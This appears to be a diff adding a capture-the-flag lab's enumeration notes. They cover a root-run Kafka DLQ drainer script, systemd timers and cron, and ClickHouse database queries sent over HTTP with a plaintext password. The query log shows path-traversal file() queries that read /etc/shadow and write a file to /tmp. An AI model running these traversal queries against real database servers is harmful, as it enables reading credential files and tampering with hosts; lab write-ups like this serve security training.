@@ -1,0 +1,177 @@
+№1
+
+ls -la /opt/ops/
+for f in /opt/ops/*; do echo "===== $f ====="; cat "$f" 2>/dev/null; echo; done
+total 12
+drwxr-xr-x 2 root root 4096 Oct  6 08:24 .
+drwxr-xr-x 8 root root 4096 Oct  6 08:24 ..
+-rwxr--r-- 1 root root 2661 Aug 25 09:48 dlq_drainer.py
+===== /opt/ops/dlq_drainer.py =====
+#!/usr/bin/env python3
+import os, subprocess, time, uuid
+from confluent_kafka import Consumer, KafkaError
+
+KAFKA_BOOTSTRAP = os.environ.get("KAFKA_BOOTSTRAP", "localhost:9092")
+DLQ_TOPIC = os.environ.get("DLQ_TOPIC", "aidx.flightleg.dlq.v1")
+GROUP_ID = os.environ.get("GROUP_ID", "aidx-dlq-drainer")
+QUARANTINE_DIR = os.environ.get("QUARANTINE_DIR", "/var/lib/aidx/quarantine")
+FORMATTER = os.environ.get("AIDX_FORMATTER",
+                           "/var/lib/clickhouse/user_files/aidx_quarantine.py")
+CH_PW_FILE = os.environ.get("CH_PW_FILE", "/etc/partner-sync/ch.pw")
+DRAIN_SECONDS = int(os.environ.get("DRAIN_SECONDS", "10"))
+
+def _pw():
+    try:
+        with open(CH_PW_FILE) as fh: return fh.read().strip()
+    except OSError: return ""
+
+def _record(reason, byte_len, root_tag, preview, qfile):
+    def esc(s): return s.replace("\\", "\\\\").replace("'", "\\'")
+    q = ("INSERT INTO aidx_ops.failed_ingest "
+         "(id, reason, byte_len, root_tag, preview, quarantine_path, received_at) "
+         f"VALUES ('{esc(uuid.uuid4().hex)}', '{esc(reason)}', {int(byte_len or 0)}, "
+         f"'{esc(root_tag)}', '{esc(preview)}', '{esc(qfile)}', now())")
+    subprocess.run(["clickhouse-client", "--user", "default",
+                    "--password", _pw(), "-q", q], check=False)
+
+def _format(raw):
+    p = subprocess.run(["python3", FORMATTER], input=raw,
+                       capture_output=True, check=False)
+    parts = p.stdout.decode("utf-8", "replace").strip().split("\t")
+    return tuple(parts) if len(parts) == 3 else (str(len(raw)), "UNKNOWN", "")
+
+def main():
+    os.makedirs(QUARANTINE_DIR, exist_ok=True)
+    c = Consumer({"bootstrap.servers": KAFKA_BOOTSTRAP, "group.id": GROUP_ID,
+                  "auto.offset.reset": "earliest", "enable.auto.commit": False})
+    c.subscribe([DLQ_TOPIC])
+    deadline = time.time() + DRAIN_SECONDS
+    while time.time() < deadline:
+        msg = c.poll(1.0)
+        if msg is None: continue
+        if msg.error():
+            if msg.error().code() == KafkaError._PARTITION_EOF: continue
+            continue
+        raw = msg.value() or b""
+        reason = "unknown"
+        for k, v in (msg.headers() or []):
+            if k == "reason": reason = (v or b"").decode("utf-8", "replace"); break
+        qfile = os.path.join(QUARANTINE_DIR, f"{int(time.time())}_{uuid.uuid4().hex[:8]}.xml")
+        try:
+            with open(qfile, "wb") as fh: fh.write(raw)
+        except OSError: qfile = ""
+        byte_len, root_tag, preview = _format(raw)
+        _record(reason, byte_len, root_tag, preview, qfile)
+        c.commit(msg, asynchronous=False)
+    c.close()
+
+if __name__ == "__main__":
+    main()
+
+№2
+
+systemctl list-timers --all 2>/dev/null
+NEXT                            LEFT LAST                              PASSED UNIT                         ACTIVATES
+Fri 2026-10-16 17:58:40 UTC      54s Fri 2026-10-16 17:56:40 UTC  1min 5s ago aidx-dlq-drainer.timer       aidx-dlq-drainer.service
+Fri 2026-10-16 18:00:00 UTC 2min 14s Fri 2026-10-16 17:50:19 UTC     7min ago sysstat-collect.timer        sysstat-collect.service
+Fri 2026-10-16 18:55:54 UTC    58min Fri 2026-10-16 17:10:36 UTC    47min ago fwupd-refresh.timer          fwupd-refresh.service
+Fri 2026-10-16 19:01:25 UTC  1h 3min Thu 2026-09-10 07:10:14 UTC            - motd-news.timer              motd-news.service
+Fri 2026-10-16 22:06:16 UTC  4h 8min Fri 2026-09-11 08:20:53 UTC            - apt-daily.timer              apt-daily.service
+Sat 2026-10-17 00:00:00 UTC       6h Fri 2026-10-16 13:39:13 UTC 4h 18min ago dpkg-db-backup.timer         dpkg-db-backup.service
+Sat 2026-10-17 00:00:00 UTC       6h Fri 2026-10-16 13:39:13 UTC 4h 18min ago logrotate.timer              logrotate.service
+Sat 2026-10-17 00:07:00 UTC       6h -                                      - sysstat-summary.timer        sysstat-summary.service
+Sat 2026-10-17 01:11:28 UTC       7h Fri 2026-10-16 14:33:06 UTC 3h 24min ago man-db.timer                 man-db.service
+Sat 2026-10-17 06:50:37 UTC      12h Fri 2026-10-16 14:09:46 UTC 3h 47min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
+Sat 2026-10-17 13:44:25 UTC      19h Fri 2026-10-16 13:44:25 UTC 4h 13min ago update-notifier-download.ti… update-notifier-download.ser…
+Sat 2026-10-17 13:54:11 UTC      19h Fri 2026-10-16 13:54:11 UTC  4h 3min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.servi…
+Sun 2026-10-18 03:10:46 UTC 1 day 9h Fri 2026-10-16 13:39:22 UTC 4h 18min ago e2scrub_all.timer            e2scrub_all.service
+Mon 2026-10-19 00:16:14 UTC   2 days Fri 2026-10-16 15:01:29 UTC 2h 56min ago fstrim.timer                 fstrim.service
+Tue 2026-10-20 12:35:02 UTC   3 days Tue 2026-08-25 09:57:40 UTC            - update-notifier-motd.timer   update-notifier-motd.service
+-                                  - -                                      - apport-autoreport.timer      apport-autoreport.service
+-                                  - -                                      - snapd.snap-repair.timer      snapd.snap-repair.service
+-                                  - -                                      - ua-timer.timer               ua-timer.service
+
+18 timers listed.
+martin_cole@stream:~/backups$ systemctl list-units --all 2>/dev/null | grep -iE 'dlq|drain|aidx'
+  aidx-dlq-drainer.service                                                               loaded    inactive dead      AIDX DLQ drainer and quarantine handler
+  aidx-ingest.service                                                                    loaded    active   running   AIDX ingest API (HTTP -> Kafka raw topic)
+  aidx-parser.service                                                                    loaded    active   running   AIDX parser worker (Kafka raw -> JSON topic)
+  aidx-dlq-drainer.timer                                                                 loaded    active   waiting   Run AIDX DLQ drainer every 2 minutes
+martin_cole@stream:~/backups$ cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+# You can also override PATH, but by default, newer versions inherit it from the environment
+#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+#
+total 28
+drwxr-xr-x   2 root root  4096 Feb 16  2025 .
+drwxr-xr-x 125 root root 12288 Oct  6 08:19 ..
+-rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
+-rw-r--r--   1 root root   102 Feb 16  2025 .placeholder
+-rw-r--r--   1 root root   396 Feb 16  2025 sysstat
+
+
+
+Sorry, user martin_cole may not run sudo on stream.
+
+
+
+
+
+№4
+
+CH='http://default:N3v3rs33nD4T4@db.htb-airport.htb'
+q(){ curl -s -G --data-urlencode "query=$1" "$CH/"; }
+
+q "SELECT name FROM system.databases"
+INFORMATION_SCHEMA
+aidx_ops
+default
+information_schema
+partner_feed
+system
+vendor_sync
+                                                                                                                                        
+┌──(kali㉿kali)-[~/HTB/stream]
+└─$ q "SELECT database,name,engine FROM system.tables WHERE database NOT IN ('system','INFORMATION_SCHEMA','information_schema')"
+aidx_ops        failed_ingest   MergeTree
+partner_feed    flightleg_json  MergeTree
+partner_feed    flightleg_json_kafka    Kafka
+partner_feed    flightleg_json_mv       MaterializedView
+partner_feed    flightleg_raw   MergeTree
+partner_feed    flightleg_raw_kafka     Kafka
+partner_feed    flightleg_raw_mv        MaterializedView
+vendor_sync     flightleg_status        MergeTree
+                                                                                                                                        
+┌──(kali㉿kali)-[~/HTB/stream]
+└─$ q "SELECT event_time,user,query FROM system.query_log WHERE query ILIKE '%user_files%' OR query ILIKE '%dlq%' ORDER BY event_time DESC LIMIT 20"
+2026-10-16 17:49:14     default INSERT INTO FUNCTION file(\'/var/lib/clickhouse/user_files/../../../../tmp/ch_test.txt\',\'LineAsString\',\'s String\') SELECT \'pwned\'\n
+2026-10-16 17:49:02     default SELECT * FROM file(\'/var/lib/clickhouse/user_files/../../../../etc/shadow\',\'LineAsString\') LIMIT 3\n
+2026-10-16 17:48:42     default SELECT * FROM file(\'/var/lib/clickhouse/user_files/../../../../etc/hostname\',\'LineAsString\')\n
+                                                                                                                                        
+┌──(kali㉿kali)-[~/HTB/stream]
+└─$ q "SELECT * FROM system.settings WHERE name LIKE '%user_files%' FORMAT Vertical"
+                         
+
+
+
+
+
